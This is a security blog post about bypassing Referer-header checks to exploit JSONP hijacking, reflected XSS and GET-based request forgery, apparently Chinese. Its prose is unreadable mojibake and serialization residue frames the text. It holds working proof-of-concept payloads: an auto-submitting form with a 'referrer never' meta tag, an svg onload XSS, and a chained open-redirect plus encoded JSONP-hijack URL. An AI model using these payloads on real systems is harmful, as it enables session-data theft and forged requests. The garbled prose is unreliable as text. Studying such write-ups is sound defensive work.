I"â/<h1 id="å‰è¨€">å‰è¨€</h1>

<p>åœ¨åšæµ‹è¯•çš„æ—¶å€™ä¼šé‡è§è¿™æ ·å‡ ä¸ªæ¼æ´åœºæ™¯ï¼š</p>

<ol>
  <li>JSONPè·¨åŸŸåŠ«æŒ</li>
  <li>åå°„XSS</li>
  <li>GETè¯·æ±‚ç±»å‹æ”»å‡»</li>
</ol>

<p>ä½†æ˜¯ï¼Œåœ¨ç›¸å¯¹å®‰å…¨çš„æƒ…å†µä¸‹ï¼Œéƒ½ä¼šæœ‰Referer(HTTPè¯·æ±‚å¤´)çš„é™åˆ¶ã€‚é‚£ä¹ˆè¯¥å¦‚ä½•å»åšç»•è¿‡å‘¢ï¼Ÿ</p>

<h1 id="æ­£æ–‡">æ­£æ–‡</h1>

<h2 id="ä»€ä¹ˆæ˜¯referer">ä»€ä¹ˆæ˜¯Refererï¼Ÿ</h2>

<p>Refereræ˜¯è¯·æ±‚å¤´çš„ä¸€éƒ¨åˆ†ï¼Œå‡è®¾Aç«™ä¸Šæœ‰Bç«™çš„é“¾æ¥ï¼Œåœ¨Aç«™ä¸Šç‚¹å‡»Bç«™çš„é“¾æ¥ï¼Œè¯·æ±‚å¤´ä¼šå¸¦æœ‰Refererï¼Œè€ŒRefererçš„å€¼ä¸ºAç«™çš„é“¾æ¥ï¼›è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆä¸Šæ–‡æ‰€è¯´çš„åœºæ™¯ï¼Œé‡è§äº†Refererçš„é™åˆ¶å°±å¯èƒ½GGäº†ã€‚</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x00.png" alt="0" /></p>

<h2 id="ç»•è¿‡ä¹‹é“">ç»•è¿‡ä¹‹é“</h2>

<h3 id="å¸¸è§„ç»•è¿‡">å¸¸è§„ç»•è¿‡</h3>

<p>ä¸€ä¸ªå®é™…åœºæ™¯ï¼š</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x01.png" alt="referer" /></p>

<p>å…ˆæ¥è¯´è¯´ä¸€äº›å¸¸è§„åŒ–çš„ä¸œè¥¿ï¼š</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">å­åŸŸåæ–¹å¼</code></li>
</ul>

<p>ä½¿ç”¨å­åŸŸåçš„æ–¹å¼è¿›è¡Œç»•è¿‡ï¼š</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x02.png" alt="subdomain" /></p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">åŸŸåå‰å¢åŠ </code></li>
</ul>

<p>åœ¨åŸŸåå‰é¢å¢åŠ éšæœºçš„a-zå’Œ0-9ä¹Ÿå¯ä»¥è¿›ç»•è¿‡ï¼š</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x03.png" alt="rand" /></p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">ï¼Ÿå·</code></li>
</ul>

<p>å°†åŸŸåä½œä¸ºGETè¯·æ±‚å‚æ•°è¿›è¡Œç»•è¿‡ï¼š</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x04.png" alt="subdomain" /></p>

<h3 id="æ‰“ç ´å¸¸è§„">æ‰“ç ´å¸¸è§„</h3>

<h4 id="æ— referer">æ— Referer</h4>

<p>ä¹‹å‰åœ¨åšæµ‹è¯•çš„æ—¶å€™ï¼Œå°†Refererå¤´åˆ é™¤ä¹Ÿå¯ä»¥ç»•è¿‡ï¼Œä½†æ˜¯åœ¨çœŸæ­£çš„åˆ©ç”¨ä¸­èƒ½ä¸èƒ½å»å®ç°å‘¢ï¼Ÿæ˜¯å¯ä»¥çš„ã€‚</p>

<p>åœ¨HTMLæ ‡ç­¾ä¸­æœ‰è¿™æ ·ä¸€ä¸ªæ ‡ç­¾<code class="language-plaintext highlighter-rouge">&lt;meta&gt;</code>ï¼Œè€Œè¿™ä¸ªæ ‡ç­¾æ˜¯è¡¨ç¤ºæ— Refererï¼Œå°±æ˜¯å¦‚ä¸‹çš„ä»£ç ï¼š</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"referrer"</span> <span class="na">content=</span><span class="s">"never"</span><span class="nt">&gt;</span>
</code></pre></div></div>

<p>æˆ‘åŸæ¥çš„PoCä¸ºï¼š</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;body&gt;</span>
  <span class="nt">&lt;script&gt;</span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="dl">''</span><span class="p">,</span> <span class="dl">''</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://127.0.0.1/test.php"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
    <span class="nt">&lt;script&gt;</span>
      <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
    <span class="nt">&lt;/script&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>ä¿®æ”¹ä¹‹åçš„PoCä¸ºï¼š</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"referrer"</span> <span class="na">content=</span><span class="s">"never"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;body&gt;</span>
  <span class="nt">&lt;script&gt;</span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="dl">''</span><span class="p">,</span> <span class="dl">''</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://127.0.0.1/test.php"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit request"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/form&gt;</span>
    <span class="nt">&lt;script&gt;</span>
      <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
    <span class="nt">&lt;/script&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x05.png" alt="null referer" /></p>

<h4 id="ä¸å…¶ä»–èµ„æºç»„åˆ">ä¸å…¶ä»–èµ„æºç»„åˆ</h4>

<h5 id="è¶…é“¾æ¥">è¶…é“¾æ¥</h5>

<p>åœ¨ä¸Šæ–‡å°±æåˆ°äº†Aç«™æœ‰Bç«™çš„é“¾æ¥ï¼Œåœ¨Aç«™ç‚¹å‡»Bç«™çš„é“¾æ¥ï¼ŒRefererå°±ä¸ºAç«™çš„é“¾æ¥äº†ã€‚é‚£ä¹ˆåœ¨è¿™é‡Œæˆ‘èƒ½å¦ä½¿ç”¨ç™½åå•åŸŸä¸‹çš„ä¸šåŠ¡åšè¶…é“¾æ¥ï¼Œé“¾æ¥åœ°å€ä¸ºAç«™å­˜åœ¨é—®é¢˜çš„é“¾æ¥å†æ­é…ä¸€ä¸ªç‚¹å‡»åŠ«æŒæˆ–è€…è¯±å¯¼çš„æ–¹å¼è¿›è¡Œç»„åˆæ”»å‡»ï¼Ÿ</p>

<p><em>ä¾‹å¦‚gh0st.cnåšäº†Refererçš„é™åˆ¶ï¼š</em></p>

<table>
  <thead>
    <tr>
      <th>Referer</th>
      <th>State</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>http://gh0st.cn (Current Domain)</td>
      <td>YES</td>
    </tr>
    <tr>
      <td>http://www.hi-ourlife.cn (Other Domain)</td>
      <td>NO</td>
    </tr>
    <tr>
      <td>http://a.gh0st.cn (SubDomain)</td>
      <td>YES</td>
    </tr>
  </tbody>
</table>

<p><strong>å®é™…åœºæ™¯ï¼š</strong></p>

<ul>
  <li>å…¬å¼€ä¿¡æ¯å¯¹å¤–</li>
</ul>

<p>åœ¨ä¸ªäººä¸­å¿ƒå¤„å¯ä»¥ç¼–è¾‘ä¸ªäººçš„å¾®åšåœ°å€ï¼š</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x06.png" alt="weibo" /></p>

<p>å¾®åšåœ°å€æ˜¯å¯¹å¤–çš„å…¬å¼€ä¿¡æ¯ï¼š</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x07.png" alt="weibo" /></p>

<p>é‚£ä¹ˆç»“åˆä¸€ä¸‹ç‚¹å‡»åŠ«æŒæˆ–è€…ç”¨æˆ·å¸¸è§„çš„ç‚¹å‡»äº†ï½é‚£å°±GGGGGGGäº†ï½</p>

<ul>
  <li>è®ºå›</li>
</ul>

<p>ç°åœ¨å¾ˆå¤šå‚å•†éƒ½æœ‰è‡ªå·±çš„å¼€æ”¾è®ºå›ï¼Œç‰¹åˆ«æ˜¯Discuzè¿™ç§å¾ˆå¤šï¼Œè€ŒDiscuzå›å¤æ˜¯å¯ä»¥ä½¿ç”¨è¶…é“¾æ¥çš„ï¼š</p>

<p>å›å¤è¿™æ ·çš„æ ¼å¼ï¼š<code class="language-plaintext highlighter-rouge">[url=u]t[/url]</code> uéƒ¨åˆ†ä¸ºåœ°å€ï¼Œtéƒ¨åˆ†ä¸ºåœ°å€åå­—ï½</p>

<h5 id="urlè·³è½¬">URLè·³è½¬</h5>

<p>302è·³è½¬æ˜¯å¦å¯ä»¥ï¼ŸNOï¼Œä¸å¯ä»¥ã€‚</p>

<p>è¿™é‡Œçš„URLè·³è½¬æ˜¯JavaScriptçš„URLè·³è½¬ã€‚</p>

<p>å¸¸è§çš„ä¸¤ä¸ªï¼š</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">url</span><span class="dl">"</span><span class="p">;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">url</span><span class="dl">"</span><span class="p">);</span>
</code></pre></div></div>

<h6 id="åå°„xssrefereré™åˆ¶">åå°„XSS(Refereré™åˆ¶)</h6>

<ol>
  <li>è¿™é‡Œæˆ‘å·²ç»æœ‰ä¸€ä¸ªå­˜åœ¨ä»»æ„URLè·³è½¬æ¼æ´äº†ï¼š</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">http://test.vulkey.cn/link.php?url=http://www.hi-ourlife.com</code></p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x08.png" alt="js" /></p>

<ol>
  <li>æˆ‘æœ‰ä¸€ä¸ªåå°„XSSæ¼æ´ï¼š</li>
</ol>

<p><code class="language-plaintext highlighter-rouge">http://vulkey.cn/jsonp.php?callback=vulkey</code></p>

<p>å½“ <code class="language-plaintext highlighter-rouge">referer = a.com</code> :</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x09.png" alt="xss" /></p>

<p>å½“ <code class="language-plaintext highlighter-rouge">referer = vulkey.cn</code> :</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x10.png" alt="xss" /></p>

<p>å½“ <code class="language-plaintext highlighter-rouge">referer = *.vulkey.cn</code> :</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x11.png" alt="xss" /></p>

<p>è¿™ä¸ªæ¥å£éªŒè¯äº†Refererä½¿ç”¨ä¹‹å‰çš„æ–¹æ³•æ²¡åŠæ³•ç»•è¿‡ï¼Œäºæ˜¯é‡‡ç”¨ç»„åˆæ‹³æ­é…ã€‚</p>

<p>äºæ˜¯æœ‰äº†å¦‚ä¸‹çš„æ„å»ºï¼š<code class="language-plaintext highlighter-rouge">http://test.vulkey.cn/link.php?url=http://vulkey.cn/jsonp.php?callback=vulkey&lt;svg/onload=alert(1)&gt;</code></p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x12.png" alt="xss" /></p>

<h6 id="jsonpåŠ«æŒåå°„xssurlè·³è½¬">JSONPåŠ«æŒ+åå°„XSS+URLè·³è½¬</h6>

<p>è¿™ä¸ªæ¡ˆä¾‹æ˜¯åŸºäºä¸Šé¢åå°„XSSæ¡ˆä¾‹çš„ï¼Œç°åœ¨å·²çŸ¥çš„ä¸‰ä¸ªé—®é¢˜ï¼š</p>

<ol>
  <li>JSONPæ¥å£ <code class="language-plaintext highlighter-rouge">http://vulkey.cn/jsonp.php?callback=vulkey</code> <strong>æœ‰Refereré™åˆ¶</strong></li>
  <li>åå°„XSS <code class="language-plaintext highlighter-rouge">http://vulkey.cn/jsonp.php?callback=vulkey&lt;svg/onload=alert(1)&gt;</code> <strong>æœ‰Refereré™åˆ¶</strong></li>
  <li>JavaScript URLè·³è½¬ <code class="language-plaintext highlighter-rouge">http://test.vulkey.cn/link.php?url=http://www.hi-ourlife.com</code></li>
</ol>

<p>ä¸€èˆ¬JSONPè·¨åŸŸåŠ«æŒçš„PoCæ˜¯è¿™æ ·çš„ï¼š</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span><span class="kd">function</span> <span class="nx">jsonp2</span><span class="p">(</span><span class="nx">data</span><span class="p">){</span><span class="nx">alert</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">data</span><span class="p">));}</span><span class="nt">&lt;/script&gt;</span>
<span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"url"</span><span class="nt">&gt;&lt;/script&gt;</span>
</code></pre></div></div>

<p>ä½†æ˜¯å› ä¸ºæœ‰Refereré™åˆ¶ï¼Œå°±ä¸èƒ½åœ¨è‡ªå·±çš„ç«™ç‚¹ä¸ŠåšPoCäº†ï¼Œå°±åªèƒ½åˆ©ç”¨åå°„XSSæ¼æ´æ„å»ºPoCï¼š</p>

<p><code class="language-plaintext highlighter-rouge">http://vulkey.cn/jsonp.php?callback=%3Cscript%3Efunction+vulkey(data){alert(JSON.stringify(data));}%3C/script%3E%3Cscript+src=%22http://vulkey.cn/jsonp.php?callback=vulkey%22%3E%3C/script%3E</code></p>

<p>ä½†ä»…ä»…å¦‚æ­¤æ˜¯ä¸å¤Ÿæ˜¯å› ä¸ºXSSæœ‰Refereræ¥æºçš„é™åˆ¶ï¼Œæ‰€ä»¥æœ€ç»ˆçš„PoCåº”è¯¥æ˜¯è¿™æ ·çš„ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">http://test.vulkey.cn/link.php?url=http://vulkey.cn/jsonp.php?callback=%253Cscript%253Efunction%2bvulkey%28data%29%7Balert%28JSON.stringify%28data%29%29%3B%7D%253C%2fscript%253E%253Cscript%2bsrc%3D%2522http%3A%2f%2fvulkey.cn%2fjsonp.php%3Fcallback%3Dvulkey%2522%253E%253C%2fscript%253E</code></p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/2018-08-01/0x13.png" alt="bypass" /></p>

<p>ä¹Ÿå°±æ˜¯è¯´åœ¨è¿™é‡ŒJSçš„URLè·³è½¬è§£å†³äº†XSSçš„Refereré™åˆ¶é—®é¢˜ï¼Œè€ŒXSSåˆè§£å†³äº†JSONPæ¥å£çš„Refereré™åˆ¶é—®é¢˜ï¼Œè¿™æ˜¯ä¸€ä¸ªè”åˆç»„åˆæ‹³ã€‚å¦‚æœä½ å‘ç°çš„XSSæ²¡æœ‰Refereré™åˆ¶åˆ™ä¸éœ€è¦è¿™ä¹ˆâ€éº»çƒ¦â€ã€‚</p>

<h1 id="ç»“å°¾">ç»“å°¾</h1>

<p>æ–‡ä¸­æ€»ç»“ä¸€äº›å°çš„TIPSï¼Œé’ˆå¯¹æˆ‘é‡åˆ°çš„å®é™…æ¡ˆä¾‹è¿›è¡Œäº†æ¼æ´çš„å¤ç°æˆªå›¾ï¼Œæ‰“å¼€æ€ç»´å…¶å®è¿˜æœ‰æ›´å¤šæ›´å¥½çš„æ€è·¯ï¼Œæœ‰æœºä¼šåæœŸä¼šå†™å‡ºæ¥ã€‚</p>
:ET